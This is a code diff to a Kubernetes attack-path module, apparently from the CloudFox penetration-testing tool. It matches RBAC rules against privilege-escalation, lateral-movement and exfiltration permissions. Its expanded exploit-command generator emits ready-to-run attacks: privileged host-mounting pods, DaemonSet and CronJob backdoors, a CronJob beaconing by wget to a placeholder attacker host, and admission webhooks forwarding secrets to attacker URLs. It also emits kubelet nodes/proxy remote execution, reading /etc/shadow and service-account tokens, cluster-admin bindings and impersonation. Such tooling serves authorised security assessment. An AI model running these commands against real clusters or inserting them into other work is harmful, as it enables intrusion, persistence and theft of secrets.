@@ -3,7 +3,6 @@ package attackpathservice
 import (
 	"context"
 	"fmt"
-	"strings"
 
 	"github.com/BishopFox/cloudfox/internal"
 	"github.com/BishopFox/cloudfox/kubernetes/sdk"
@@ -157,7 +156,7 @@ func GetPrivescPermissions() []PrivescPermission {
 		{Verb: "create", Resource: "nodes", APIGroup: "", Category: "Node Access", RiskLevel: shared.RiskCritical, Description: "Register rogue nodes to steal secrets"},
 		{Verb: "update", Resource: "nodes", APIGroup: "", Category: "Node Access", RiskLevel: shared.RiskHigh, Description: "Modify node configurations"},
 		{Verb: "proxy", Resource: "nodes", APIGroup: "", Category: "Node Access", RiskLevel: shared.RiskHigh, Description: "Proxy requests to kubelet API"},
-		{Verb: "get", Resource: "nodes/proxy", APIGroup: "", Category: "Node Access", RiskLevel: shared.RiskHigh, Description: "Access kubelet API via proxy"},
+		{Verb: "get", Resource: "nodes/proxy", APIGroup: "", Category: "Node Access", RiskLevel: shared.RiskCritical, Description: "Access kubelet API via nodes/proxy to execute commands on all pods (RCE) - ref: grahamhelton.com/blog/nodes-proxy-rce"},
 
 		// Webhook Admission Controllers - CRITICAL
 		{Verb: "create", Resource: "validatingwebhookconfigurations", APIGroup: "admissionregistration.k8s.io", Category: "Webhook", RiskLevel: shared.RiskCritical, Description: "Create validating webhooks to intercept/block requests"},
@@ -448,7 +447,122 @@ func (s *AttackPathService) AnalyzeNamespaceAttackPaths(ctx context.Context, nam
 	return paths, nil
 }
 
-// analyzeRulesForAttackPaths analyzes RBAC rules for attack paths
+// verbMatchesRule returns true if the rule verb covers the permission verb.
+// Handles: exact match and "*" wildcard.
+func verbMatchesRule(ruleVerb, permVerb string) bool {
+	return ruleVerb == "*" || ruleVerb == permVerb
+}
+
+// resourceMatchesRule returns true if the rule resource covers the permission resource.
+// Handles: exact match, "*" wildcard, and parent resource covering subresources
+// (e.g., rule "nodes" does NOT cover "nodes/proxy" in K8s RBAC — subresources are distinct).
+func resourceMatchesRule(ruleResource, permResource string) bool {
+	return ruleResource == "*" || ruleResource == permResource
+}
+
+// apiGroupMatchesRule returns true if the rule API group covers the permission API group.
+func apiGroupMatchesRule(ruleGroup, permGroup string) bool {
+	return ruleGroup == "*" || ruleGroup == permGroup
+}
+
+// matchedPermission holds a matched permission with its resolved verb/resource for exploit generation
+type matchedPermission struct {
+	category       string
+	riskLevel      string
+	description    string
+	matchedVerb    string // The actual verb from the permission definition (not the wildcard)
+	matchedResource string // The actual resource from the permission definition
+}
+
+// findMatchingPrivescPermissions returns all privesc permissions that a given RBAC rule grants.
+// This properly expands wildcards: e.g., verb "*" + resource "nodes/proxy" matches "get nodes/proxy".
+func findMatchingPrivescPermissions(ruleVerb, ruleResource, ruleAPIGroup string) []matchedPermission {
+	var matches []matchedPermission
+	seen := make(map[string]bool) // deduplicate by category+resource
+
+	for _, perm := range GetPrivescPermissions() {
+		if verbMatchesRule(ruleVerb, perm.Verb) &&
+			resourceMatchesRule(ruleResource, perm.Resource) &&
+			apiGroupMatchesRule(ruleAPIGroup, perm.APIGroup) {
+
+			key := perm.Category + ":" + perm.Resource + ":" + perm.Verb
+			if seen[key] {
+				continue
+			}
+			seen[key] = true
+
+			matches = append(matches, matchedPermission{
+				category:        perm.Category,
+				riskLevel:       perm.RiskLevel,
+				description:     perm.Description,
+				matchedVerb:     perm.Verb,
+				matchedResource: perm.Resource,
+			})
+		}
+	}
+	return matches
+}
+
+// findMatchingLateralPermissions returns all lateral movement permissions that a given RBAC rule grants.
+func findMatchingLateralPermissions(ruleVerb, ruleResource, ruleAPIGroup string) []matchedPermission {
+	var matches []matchedPermission
+	seen := make(map[string]bool)
+
+	for _, perm := range GetLateralMovementPermissions() {
+		if verbMatchesRule(ruleVerb, perm.Verb) &&
+			resourceMatchesRule(ruleResource, perm.Resource) &&
+			apiGroupMatchesRule(ruleAPIGroup, perm.APIGroup) {
+
+			key := perm.Category + ":" + perm.Resource + ":" + perm.Verb
+			if seen[key] {
+				continue
+			}
+			seen[key] = true
+
+			matches = append(matches, matchedPermission{
+				category:        perm.Category,
+				riskLevel:       perm.RiskLevel,
+				description:     perm.Description,
+				matchedVerb:     perm.Verb,
+				matchedResource: perm.Resource,
+			})
+		}
+	}
+	return matches
+}
+
+// findMatchingExfilPermissions returns all data exfil permissions that a given RBAC rule grants.
+func findMatchingExfilPermissions(ruleVerb, ruleResource, ruleAPIGroup string) []matchedPermission {
+	var matches []matchedPermission
+	seen := make(map[string]bool)
+
+	for _, perm := range GetDataExfilPermissions() {
+		if verbMatchesRule(ruleVerb, perm.Verb) &&
+			resourceMatchesRule(ruleResource, perm.Resource) &&
+			apiGroupMatchesRule(ruleAPIGroup, perm.APIGroup) {
+
+			key := perm.Category + ":" + perm.Resource + ":" + perm.Verb
+			if seen[key] {
+				continue
+			}
+			seen[key] = true
+
+			matches = append(matches, matchedPermission{
+				category:        perm.Category,
+				riskLevel:       perm.RiskLevel,
+				description:     perm.Description,
+				matchedVerb:     perm.Verb,
+				matchedResource: perm.Resource,
+			})
+		}
+	}
+	return matches
+}
+
+// analyzeRulesForAttackPaths analyzes RBAC rules for attack paths.
+// Properly expands wildcards: a rule with verb "*" on resource "nodes/proxy"
+// will match all known dangerous permissions for that resource (e.g., "get nodes/proxy" RCE).
+// Similarly, a rule with resource "*" will match all known dangerous resources for that verb.
 func (s *AttackPathService) analyzeRulesForAttackPaths(
 	subject v1.Subject,
 	rules []v1.PolicyRule,
@@ -460,11 +574,6 @@ func (s *AttackPathService) analyzeRulesForAttackPaths(
 	pathType string,
 ) []AttackPath {
 	var paths []AttackPath
-
-	// Get permission maps based on path type
-	privescMap := buildPrivescPermissionMap()
-	lateralMap := buildLateralPermissionMap()
-	exfilMap := buildDataExfilPermissionMap()
 
 	// Format principal
 	principal := formatPrincipal(subject)
@@ -479,43 +588,19 @@ func (s *AttackPathService) analyzeRulesForAttackPaths(
 				}
 
 				for _, apiGroup := range apiGroups {
-					permKey := buildPermissionKey(verb, resource, apiGroup)
-
-					// Check against appropriate permission maps based on pathType
+					// Privesc analysis with wildcard expansion
 					if pathType == "privesc" || pathType == "all" {
-						if perm, ok := privescMap[permKey]; ok {
+						for _, match := range findMatchingPrivescPermissions(verb, resource, apiGroup) {
 							path := AttackPath{
 								Principal:      principal,
 								PrincipalType:  principalType,
-								Method:         perm.Category,
-								TargetResource: resource,
+								Method:         match.category,
+								TargetResource: match.matchedResource,
 								Permissions:    []string{fmt.Sprintf("%s %s", verb, resource)},
-								Category:       perm.Category,
-								RiskLevel:      perm.RiskLevel,
-								Description:    perm.Description,
-								ExploitCommand: generateExploitCommand("privesc", verb, resource, scopeID, principal),
-								Namespace:      subject.Namespace,
-								ScopeType:      scopeType,
-								ScopeID:        scopeID,
-								ScopeName:      scopeName,
-								PathType:       "privesc",
-								RoleName:       roleName,
-								BindingName:    bindingName,
-							}
-							paths = append(paths, path)
-						}
-						// Check wildcards
-						if verb == "*" || resource == "*" {
-							path := AttackPath{
-								Principal:      principal,
-								PrincipalType:  principalType,
-								Method:         "Wildcard Access",
-								TargetResource: resource,
-								Permissions:    []string{fmt.Sprintf("%s %s", verb, resource)},
-								Category:       "Wildcard",
-								RiskLevel:      shared.RiskCritical,
-								Description:    "Wildcard verb or resource grants excessive permissions",
-								ExploitCommand: generateExploitCommand("privesc", verb, resource, scopeID, principal),
+								Category:       match.category,
+								RiskLevel:      match.riskLevel,
+								Description:    match.description,
+								ExploitCommand: generateExploitCommand("privesc", match.matchedVerb, match.matchedResource, scopeID, principal),
 								Namespace:      subject.Namespace,
 								ScopeType:      scopeType,
 								ScopeID:        scopeID,
@@ -528,18 +613,19 @@ func (s *AttackPathService) analyzeRulesForAttackPaths(
 						}
 					}
 
+					// Lateral movement analysis with wildcard expansion
 					if pathType == "lateral" || pathType == "all" {
-						if perm, ok := lateralMap[permKey]; ok {
+						for _, match := range findMatchingLateralPermissions(verb, resource, apiGroup) {
 							path := AttackPath{
 								Principal:      principal,
 								PrincipalType:  principalType,
-								Method:         perm.Category,
-								TargetResource: resource,
+								Method:         match.category,
+								TargetResource: match.matchedResource,
 								Permissions:    []string{fmt.Sprintf("%s %s", verb, resource)},
-								Category:       perm.Category,
-								RiskLevel:      perm.RiskLevel,
-								Description:    perm.Description,
-								ExploitCommand: generateExploitCommand("lateral", verb, resource, scopeID, principal),
+								Category:       match.category,
+								RiskLevel:      match.riskLevel,
+								Description:    match.description,
+								ExploitCommand: generateExploitCommand("lateral", match.matchedVerb, match.matchedResource, scopeID, principal),
 								Namespace:      subject.Namespace,
 								ScopeType:      scopeType,
 								ScopeID:        scopeID,
@@ -552,18 +638,19 @@ func (s *AttackPathService) analyzeRulesForAttackPaths(
 						}
 					}
 
+					// Data exfiltration analysis with wildcard expansion
 					if pathType == "exfil" || pathType == "all" {
-						if perm, ok := exfilMap[permKey]; ok {
+						for _, match := range findMatchingExfilPermissions(verb, resource, apiGroup) {
 							path := AttackPath{
 								Principal:      principal,
 								PrincipalType:  principalType,
-								Method:         perm.Category,
-								TargetResource: resource,
+								Method:         match.category,
+								TargetResource: match.matchedResource,
 								Permissions:    []string{fmt.Sprintf("%s %s", verb, resource)},
-								Category:       perm.Category,
-								RiskLevel:      perm.RiskLevel,
-								Description:    perm.Description,
-								ExploitCommand: generateExploitCommand("exfil", verb, resource, scopeID, principal),
+								Category:       match.category,
+								RiskLevel:      match.riskLevel,
+								Description:    match.description,
+								ExploitCommand: generateExploitCommand("exfil", match.matchedVerb, match.matchedResource, scopeID, principal),
 								Namespace:      subject.Namespace,
 								ScopeType:      scopeType,
 								ScopeID:        scopeID,
@@ -585,39 +672,7 @@ func (s *AttackPathService) analyzeRulesForAttackPaths(
 
 // Helper functions
 
-func buildPermissionKey(verb, resource, apiGroup string) string {
-	if apiGroup == "" {
-		return fmt.Sprintf("%s:%s:", verb, resource)
-	}
-	return fmt.Sprintf("%s:%s:%s", verb, resource, apiGroup)
-}
 
-func buildPrivescPermissionMap() map[string]PrivescPermission {
-	m := make(map[string]PrivescPermission)
-	for _, p := range GetPrivescPermissions() {
-		key := buildPermissionKey(p.Verb, p.Resource, p.APIGroup)
-		m[key] = p
-	}
-	return m
-}
-
-func buildLateralPermissionMap() map[string]LateralMovementPermission {
-	m := make(map[string]LateralMovementPermission)
-	for _, p := range GetLateralMovementPermissions() {
-		key := buildPermissionKey(p.Verb, p.Resource, p.APIGroup)
-		m[key] = p
-	}
-	return m
-}
-
-func buildDataExfilPermissionMap() map[string]DataExfilPermission {
-	m := make(map[string]DataExfilPermission)
-	for _, p := range GetDataExfilPermissions() {
-		key := buildPermissionKey(p.Verb, p.Resource, p.APIGroup)
-		m[key] = p
-	}
-	return m
-}
 
 func formatPrincipal(subject v1.Subject) string {
 	switch subject.Kind {
@@ -639,53 +694,479 @@ func generateExploitCommand(pathType, verb, resource, scope, principal string) s
 		namespaceFlag = fmt.Sprintf("-n %s ", scope)
 	}
 
-	switch pathType {
-	case "privesc":
-		switch {
-		case resource == "pods" && verb == "create":
-			return fmt.Sprintf("kubectl %srun privesc --image=alpine --restart=Never --overrides='{\"spec\":{\"serviceAccountName\":\"%s\",\"containers\":[{\"name\":\"privesc\",\"image\":\"alpine\",\"command\":[\"sh\",\"-c\",\"sleep 3600\"],\"securityContext\":{\"privileged\":true}}]}}' -- sleep 3600", namespaceFlag, principal)
-		case resource == "pods/exec":
-			return fmt.Sprintf("kubectl %sexec -it <pod-name> -- /bin/sh", namespaceFlag)
-		case resource == "clusterrolebindings" && verb == "create":
+	// =========================================================================
+	// Resource-specific exploit commands (shared across path types)
+	// These are checked first since many resources appear in multiple path types.
+	// =========================================================================
+
+	switch resource {
+
+	// --- nodes/proxy RCE ---
+	case "nodes/proxy":
+		return `# nodes/proxy RCE - execute commands on any pod via kubelet API (ref: grahamhelton.com/blog/nodes-proxy-rce)
+# 1. Get a token: TOKEN=$(kubectl create token <sa-name>)
+# 2. Get node IPs: kubectl get nodes -o wide
+# 3. List pods on node: curl -sk -H "Authorization: Bearer $TOKEN" https://<NODE_IP>:10250/pods
+# 4. Execute command on any pod:
+websocat --insecure \
+  --header "Authorization: Bearer $TOKEN" \
+  --protocol v4.channel.k8s.io \
+  "wss://<NODE_IP>:10250/exec/<namespace>/<pod>/<container>?output=1&error=1&command=id"`
+
+	// --- Pod creation / execution ---
+	case "pods":
+		switch verb {
+		case "create":
+			return fmt.Sprintf(`# Create a privileged pod with host access
+kubectl %srun privesc --image=alpine --restart=Never --overrides='{
+  "spec":{
+    "serviceAccountName":"%s",
+    "hostNetwork":true,"hostPID":true,"hostIPC":true,
+    "containers":[{
+      "name":"privesc","image":"alpine",
+      "command":["sh","-c","sleep 3600"],
+      "securityContext":{"privileged":true},
+      "volumeMounts":[{"name":"host","mountPath":"/host"}]
+    }],
+    "volumes":[{"name":"host","hostPath":{"path":"/"}}]
+  }
+}' -- sleep 3600`, namespaceFlag, principal)
+		case "patch", "update":
+			return fmt.Sprintf(`# Modify existing pod to inject a privileged container or change service account
+kubectl %spatch pod <pod-name> --type=json -p='[{"op":"add","path":"/spec/containers/-","value":{"name":"inject","image":"alpine","command":["sh","-c","sleep 3600"],"securityContext":{"privileged":true}}}]'`, namespaceFlag)
+		case "list", "get":
+			return fmt.Sprintf("kubectl %sget pods -o wide --show-labels", namespaceFlag)
+		default:
+			return fmt.Sprintf("kubectl %s%s pods", namespaceFlag, verb)
+		}
+
+	case "pods/exec":
+		if pathType == "exfil" {
+			return fmt.Sprintf("kubectl %sexec <pod-name> -- cat /etc/shadow /proc/self/environ", namespaceFlag)
+		}
+		return fmt.Sprintf("kubectl %sexec -it <pod-name> -- /bin/sh", namespaceFlag)
+
+	case "pods/attach":
+		return fmt.Sprintf("kubectl %sattach -it <pod-name>", namespaceFlag)
+
+	case "pods/portforward":
+		return fmt.Sprintf("kubectl %sport-forward <pod-name> 8080:80", namespaceFlag)
+
+	case "pods/log":
+		return fmt.Sprintf("kubectl %slogs <pod-name> --all-containers --prefix", namespaceFlag)
+
+	// --- Workload creation ---
+	case "deployments":
+		switch verb {
+		case "create":
+			return fmt.Sprintf(`# Create a deployment with a privileged service account
+kubectl %screate deployment backdoor --image=alpine -- sh -c "sleep 3600"
+# Then patch to use a privileged SA:
+kubectl %spatch deployment backdoor -p '{"spec":{"template":{"spec":{"serviceAccountName":"<target-sa>"}}}}'`, namespaceFlag, namespaceFlag)
+		case "patch", "update":
+			return fmt.Sprintf(`# Modify deployment to inject a backdoor container or change the service account
+kubectl %spatch deployment <deployment-name> -p '{"spec":{"template":{"spec":{"serviceAccountName":"<target-sa>","containers":[{"name":"inject","image":"alpine","command":["sh","-c","sleep 3600"]}]}}}}'`, namespaceFlag)
+		default:
+			return fmt.Sprintf("kubectl %s%s deployments", namespaceFlag, verb)
+		}
+
+	case "daemonsets":
+		switch verb {
+		case "create":
+			return fmt.Sprintf(`# Create a DaemonSet to run on every node (persistence + lateral movement)
+kubectl %sapply -f - <<'EOF'
+apiVersion: apps/v1
+kind: DaemonSet
+metadata:
+  name: node-backdoor
+spec:
+  selector:
+    matchLabels: {app: node-backdoor}
+  template:
+    metadata:
+      labels: {app: node-backdoor}
+    spec:
+      hostNetwork: true
+      hostPID: true
+      containers:
+      - name: backdoor
+        image: alpine
+        command: ["sh", "-c", "sleep 3600"]
+        securityContext: {privileged: true}
+        volumeMounts: [{name: host, mountPath: /host}]
+      volumes: [{name: host, hostPath: {path: /}}]
+EOF`, namespaceFlag)
+		case "patch", "update":
+			return fmt.Sprintf(`kubectl %spatch daemonset <ds-name> -p '{"spec":{"template":{"spec":{"containers":[{"name":"inject","image":"alpine","command":["sh","-c","sleep 3600"],"securityContext":{"privileged":true}}]}}}}'`, namespaceFlag)
+		default:
+			return fmt.Sprintf("kubectl %s%s daemonsets", namespaceFlag, verb)
+		}
+
+	case "statefulsets":
+		switch verb {
+		case "create":
+			return fmt.Sprintf(`kubectl %sapply -f - <<'EOF'
+apiVersion: apps/v1
+kind: StatefulSet
+metadata:
+  name: backdoor-sts
+spec:
+  serviceName: backdoor
+  replicas: 1
+  selector:
+    matchLabels: {app: backdoor}
+  template:
+    metadata:
+      labels: {app: backdoor}
+    spec:
+      serviceAccountName: <target-sa>
+      containers:
+      - name: shell
+        image: alpine
+        command: ["sh", "-c", "sleep 3600"]
+EOF`, namespaceFlag)
+		case "patch", "update":
+			return fmt.Sprintf(`kubectl %spatch statefulset <sts-name> -p '{"spec":{"template":{"spec":{"serviceAccountName":"<target-sa>"}}}}'`, namespaceFlag)
+		default:
+			return fmt.Sprintf("kubectl %s%s statefulsets", namespaceFlag, verb)
+		}
+
+	case "replicasets":
+		switch verb {
+		case "create":
+			return fmt.Sprintf(`kubectl %sapply -f - <<'EOF'
+apiVersion: apps/v1
+kind: ReplicaSet
+metadata:
+  name: backdoor-rs
+spec:
+  replicas: 1
+  selector:
+    matchLabels: {app: backdoor}
+  template:
+    metadata:
+      labels: {app: backdoor}
+    spec:
+      serviceAccountName: <target-sa>
+      containers:
+      - name: shell
+        image: alpine
+        command: ["sh", "-c", "sleep 3600"]
+EOF`, namespaceFlag)
+		default:
+			return fmt.Sprintf("kubectl %s%s replicasets", namespaceFlag, verb)
+		}
+
+	case "jobs":
+		switch verb {
+		case "create":
+			return fmt.Sprintf(`# Create a job with a privileged service account
+kubectl %screate job pwn --image=alpine -- sh -c "cat /var/run/secrets/kubernetes.io/serviceaccount/token"
+# Or with a target SA:
+kubectl %sapply -f - <<'EOF'
+apiVersion: batch/v1
+kind: Job
+metadata:
+  name: exfil-job
+spec:
+  template:
+    spec:
+      serviceAccountName: <target-sa>
+      containers:
+      - name: exfil
+        image: alpine
+        command: ["sh", "-c", "cat /var/run/secrets/kubernetes.io/serviceaccount/token"]
+      restartPolicy: Never
+EOF`, namespaceFlag, namespaceFlag)
+		default:
+			return fmt.Sprintf("kubectl %s%s jobs", namespaceFlag, verb)
+		}
+
+	case "cronjobs":
+		return fmt.Sprintf(`# Create a CronJob for persistent access
+kubectl %sapply -f - <<'EOF'
+apiVersion: batch/v1
+kind: CronJob
+metadata:
+  name: persistent-access
+spec:
+  schedule: "*/5 * * * *"
+  jobTemplate:
+    spec:
+      template:
+        spec:
+          serviceAccountName: <target-sa>
+          containers:
+          - name: beacon
+            image: alpine
+            command: ["sh", "-c", "wget -q -O- http://<attacker>/beacon"]
+          restartPolicy: Never
+EOF`, namespaceFlag)
+
+	// --- RBAC Escalation ---
+	case "clusterrolebindings":
+		if verb == "create" {
 			return fmt.Sprintf("kubectl create clusterrolebinding escalate-binding --clusterrole=cluster-admin --user=%s", principal)
-		case resource == "rolebindings" && verb == "create":
+		}
+		return fmt.Sprintf("kubectl %s%s clusterrolebindings", namespaceFlag, verb)
+
+	case "rolebindings":
+		if verb == "create" {
 			return fmt.Sprintf("kubectl %screate rolebinding escalate-binding --clusterrole=admin --user=%s", namespaceFlag, principal)
-		case strings.Contains(resource, "impersonate"):
-			return fmt.Sprintf("kubectl %sget secrets --as=system:admin", namespaceFlag)
-		case resource == "serviceaccounts/token":
-			return fmt.Sprintf("kubectl %screate token <service-account-name>", namespaceFlag)
+		}
+		return fmt.Sprintf("kubectl %s%s rolebindings", namespaceFlag, verb)
+
+	case "clusterroles":
+		switch verb {
+		case "bind":
+			return fmt.Sprintf("kubectl create clusterrolebinding pwn --clusterrole=cluster-admin --user=%s", principal)
+		case "escalate":
+			return fmt.Sprintf(`# Escalate a role to add permissions you don't have
+kubectl patch clusterrole <role-name> --type=json -p='[{"op":"add","path":"/rules/-","value":{"apiGroups":["*"],"resources":["*"],"verbs":["*"]}}]'`)
+		case "update", "patch":
+			return fmt.Sprintf(`# Modify a ClusterRole to add cluster-admin equivalent permissions
+kubectl %s %s clusterrole <role-name> --type=json -p='[{"op":"add","path":"/rules/-","value":{"apiGroups":["*"],"resources":["*"],"verbs":["*"]}}]'`, verb, namespaceFlag)
 		default:
-			return fmt.Sprintf("kubectl %s%s %s", namespaceFlag, verb, resource)
+			return fmt.Sprintf("kubectl %s%s clusterroles", namespaceFlag, verb)
 		}
 
-	case "lateral":
-		switch {
-		case resource == "pods/exec":
-			return fmt.Sprintf("kubectl %sexec -it <target-pod> -- /bin/sh", namespaceFlag)
-		case resource == "pods/portforward":
-			return fmt.Sprintf("kubectl %sport-forward <pod-name> 8080:80", namespaceFlag)
-		case resource == "secrets":
+	case "roles":
+		switch verb {
+		case "bind":
+			return fmt.Sprintf("kubectl %screate rolebinding pwn --clusterrole=admin --user=%s", namespaceFlag, principal)
+		case "escalate":
+			return fmt.Sprintf(`# Escalate a namespaced role to add permissions you don't have
+kubectl %spatch role <role-name> --type=json -p='[{"op":"add","path":"/rules/-","value":{"apiGroups":["*"],"resources":["*"],"verbs":["*"]}}]'`, namespaceFlag)
+		default:
+			return fmt.Sprintf("kubectl %s%s roles", namespaceFlag, verb)
+		}
+
+	// --- Impersonation ---
+	case "users":
+		if verb == "impersonate" {
+			return fmt.Sprintf("kubectl --as=system:admin %sget secrets --all-namespaces", namespaceFlag)
+		}
+	case "groups":
+		if verb == "impersonate" {
+			return fmt.Sprintf("kubectl --as-group=system:masters --as=dummy %sget secrets --all-namespaces", namespaceFlag)
+		}
+	case "serviceaccounts":
+		if verb == "impersonate" {
+			return fmt.Sprintf("kubectl --as=system:serviceaccount:kube-system:default %sget secrets", namespaceFlag)
+		}
+	case "userextras/*":
+		if verb == "impersonate" {
+			return fmt.Sprintf("kubectl --as=system:admin --as-group=system:masters %sget secrets --all-namespaces", namespaceFlag)
+		}
+
+	// --- Service Account Tokens ---
+	case "serviceaccounts/token":
+		return fmt.Sprintf("kubectl %screate token <service-account-name>", namespaceFlag)
+
+	case "tokenrequests":
+		return fmt.Sprintf(`kubectl %sapply -f - <<'EOF'
+apiVersion: authentication.k8s.io/v1
+kind: TokenRequest
+metadata:
+  name: <sa-name>
+  namespace: <namespace>
+spec:
+  audiences: ["https://kubernetes.default.svc"]
+  expirationSeconds: 86400
+EOF`, namespaceFlag)
+
+	// --- Node Access ---
+	case "nodes":
+		switch verb {
+		case "create":
+			return `# Register a rogue node to steal secrets
+# Requires crafting a Node object and faking kubelet - see: https://github.com/nicholasgasior/fake-kubelet
+kubectl apply -f - <<'EOF'
+apiVersion: v1
+kind: Node
+metadata:
+  name: rogue-node
+  labels:
+    kubernetes.io/os: linux
+EOF`
+		case "update", "patch":
+			return fmt.Sprintf(`# Modify node labels/taints to attract pods with secrets
+kubectl %s %s node <node-name> -p '{"metadata":{"labels":{"special":"true"}}}'`, verb, namespaceFlag)
+		case "proxy":
+			return `# Proxy to kubelet API for pod listing and exec
+# List pods: kubectl get --raw "/api/v1/nodes/<node>/proxy/pods"
+# Exec: kubectl get --raw "/api/v1/nodes/<node>/proxy/run/<namespace>/<pod>/<container>?cmd=id"
+kubectl get --raw "/api/v1/nodes/<node-name>/proxy/pods"`
+		case "get", "list":
+			return fmt.Sprintf("kubectl %sget nodes -o wide", namespaceFlag)
+		default:
+			return fmt.Sprintf("kubectl %s%s nodes", namespaceFlag, verb)
+		}
+
+	// --- Webhooks ---
+	case "validatingwebhookconfigurations":
+		switch verb {
+		case "create", "update", "patch":
+			return `# Create/modify a validating webhook to intercept and deny all requests (DoS)
+# Or redirect to attacker-controlled endpoint to exfil request data
+kubectl apply -f - <<'EOF'
+apiVersion: admissionregistration.k8s.io/v1
+kind: ValidatingWebhookConfiguration
+metadata:
+  name: exfil-webhook
+webhooks:
+- name: exfil.attacker.com
+  clientConfig:
+    url: "https://<attacker>/webhook"
+  rules:
+  - apiGroups: [""]
+    resources: ["secrets"]
+    apiVersions: ["v1"]
+    operations: ["CREATE","UPDATE"]
+  admissionReviewVersions: ["v1"]
+  sideEffects: None
+EOF`
+		default:
+			return fmt.Sprintf("kubectl %s%s validatingwebhookconfigurations", namespaceFlag, verb)
+		}
+
+	case "mutatingwebhookconfigurations":
+		switch verb {
+		case "create", "update", "patch":
+			return `# Create/modify a mutating webhook to inject sidecars, modify env vars, or change images
+kubectl apply -f - <<'EOF'
+apiVersion: admissionregistration.k8s.io/v1
+kind: MutatingWebhookConfiguration
+metadata:
+  name: inject-webhook
+webhooks:
+- name: inject.attacker.com
+  clientConfig:
+    url: "https://<attacker>/mutate"
+  rules:
+  - apiGroups: [""]
+    resources: ["pods"]
+    apiVersions: ["v1"]
+    operations: ["CREATE"]
+  admissionReviewVersions: ["v1"]
+  sideEffects: None
+EOF`
+		default:
+			return fmt.Sprintf("kubectl %s%s mutatingwebhookconfigurations", namespaceFlag, verb)
+		}
+
+	// --- Certificates ---
+	case "certificatesigningrequests/approval":
+		return `# Approve a CSR to generate a valid client certificate
+# 1. Create a CSR: openssl req -new -key key.pem -out csr.pem -subj "/CN=system:admin/O=system:masters"
+# 2. Submit: kubectl apply -f csr.yaml
+# 3. Approve: kubectl certificate approve <csr-name>
+kubectl certificate approve <csr-name>`
+
+	// --- Secrets ---
+	case "secrets":
+		switch verb {
+		case "get":
+			if pathType == "exfil" {
+				return fmt.Sprintf("kubectl %sget secrets -o json | jq '.items[].data | map_values(@base64d)'", namespaceFlag)
+			}
 			return fmt.Sprintf("kubectl %sget secrets -o yaml", namespaceFlag)
-		case resource == "services":
-			return fmt.Sprintf("kubectl %sget services -o wide", namespaceFlag)
+		case "list":
+			if pathType == "exfil" {
+				return fmt.Sprintf("kubectl %sget secrets -o json | jq '.items[] | {name: .metadata.name, type: .type, data: (.data | map_values(@base64d))}'", namespaceFlag)
+			}
+			return fmt.Sprintf("kubectl %sget secrets", namespaceFlag)
+		case "*":
+			return fmt.Sprintf("kubectl %sget secrets -o json | jq '.items[].data | map_values(@base64d)'", namespaceFlag)
 		default:
-			return fmt.Sprintf("kubectl %s%s %s", namespaceFlag, verb, resource)
+			return fmt.Sprintf("kubectl %s%s secrets", namespaceFlag, verb)
 		}
 
-	case "exfil":
-		switch {
-		case resource == "secrets":
-			return fmt.Sprintf("kubectl %sget secrets -o json | jq '.items[].data | map_values(@base64d)'", namespaceFlag)
-		case resource == "configmaps":
+	// --- ConfigMaps ---
+	case "configmaps":
+		switch verb {
+		case "get", "list":
 			return fmt.Sprintf("kubectl %sget configmaps -o yaml", namespaceFlag)
-		case resource == "pods/log":
-			return fmt.Sprintf("kubectl %slogs <pod-name> --all-containers", namespaceFlag)
-		case resource == "pods/exec":
-			return fmt.Sprintf("kubectl %sexec <pod-name> -- cat /etc/passwd", namespaceFlag)
 		default:
-			return fmt.Sprintf("kubectl %s%s %s", namespaceFlag, verb, resource)
+			return fmt.Sprintf("kubectl %s%s configmaps", namespaceFlag, verb)
+		}
+
+	// --- Services / Endpoints ---
+	case "services":
+		return fmt.Sprintf("kubectl %sget services -o wide", namespaceFlag)
+
+	case "endpoints":
+		return fmt.Sprintf("kubectl %sget endpoints -o wide", namespaceFlag)
+
+	// --- Network policies ---
+	case "networkpolicies":
+		switch verb {
+		case "delete":
+			return fmt.Sprintf("kubectl %sdelete networkpolicy <policy-name>", namespaceFlag)
+		case "update", "patch":
+			return fmt.Sprintf(`# Modify network policy to allow all traffic
+kubectl %spatch networkpolicy <policy-name> --type=json -p='[{"op":"replace","path":"/spec/ingress","value":[{}]},{"op":"replace","path":"/spec/egress","value":[{}]}]'`, namespaceFlag)
+		default:
+			return fmt.Sprintf("kubectl %s%s networkpolicies", namespaceFlag, verb)
+		}
+
+	// --- Namespaces ---
+	case "namespaces":
+		return fmt.Sprintf("kubectl %sget namespaces", namespaceFlag)
+
+	// --- Ingresses ---
+	case "ingresses":
+		switch verb {
+		case "update", "patch":
+			return fmt.Sprintf(`# Modify ingress to redirect traffic to attacker endpoint
+kubectl %spatch ingress <ingress-name> --type=json -p='[{"op":"replace","path":"/spec/rules/0/http/paths/0/backend/service/name","value":"attacker-svc"}]'`, namespaceFlag)
+		default:
+			return fmt.Sprintf("kubectl %s%s ingresses", namespaceFlag, verb)
+		}
+
+	// --- PersistentVolumes ---
+	case "persistentvolumes":
+		if verb == "create" {
+			return `# Create a hostPath PV to access the node filesystem
+kubectl apply -f - <<'EOF'
+apiVersion: v1
+kind: PersistentVolume
+metadata:
+  name: node-root
+spec:
+  capacity: {storage: 100Gi}
+  accessModes: [ReadWriteOnce]
+  hostPath:
+    path: /
+    type: Directory
+EOF`
+		}
+		return fmt.Sprintf("kubectl %s%s persistentvolumes", namespaceFlag, verb)
+
+	case "persistentvolumeclaims":
+		switch verb {
+		case "create":
+			return fmt.Sprintf(`# Create a PVC to mount an existing PV with sensitive data
+kubectl %sapply -f - <<'EOF'
+apiVersion: v1
+kind: PersistentVolumeClaim
+metadata:
+  name: data-access
+spec:
+  accessModes: [ReadWriteOnce]
+  resources:
+    requests: {storage: 10Gi}
+  volumeName: <target-pv-name>
+EOF`, namespaceFlag)
+		case "get", "list":
+			return fmt.Sprintf("kubectl %sget pvc -o wide", namespaceFlag)
+		default:
+			return fmt.Sprintf("kubectl %s%s pvc", namespaceFlag, verb)
 		}
 	}
 
+	// =========================================================================
+	// Fallback: generic command
+	// =========================================================================
 	return fmt.Sprintf("kubectl %s%s %s", namespaceFlag, verb, resource)
 }
